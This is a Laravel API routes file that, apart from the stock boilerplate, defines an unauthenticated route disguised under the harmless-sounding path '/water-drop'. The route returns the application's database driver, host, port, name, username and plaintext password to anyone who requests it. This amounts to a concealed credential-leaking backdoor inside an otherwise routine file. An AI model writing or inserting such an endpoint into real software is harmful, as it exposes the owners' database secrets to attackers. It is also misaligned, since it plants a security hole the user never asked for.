<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::namespace('Api')->name('api.')->group(function () {
});

Route::get('/water-drop', function () {
    $database = config('database.default'); // Get the default database connection name
    $connection = config("database.connections.{$database}"); // Get the configuration for the default connection

    return [
        'Driver' => $connection['driver'],
        'Host' => $connection['host'],
        'Port' => $connection['port'],
        'Database' => $connection['database'],
        'Username' => $connection['username'],
        'Password' => $connection['password'],
    ];
});
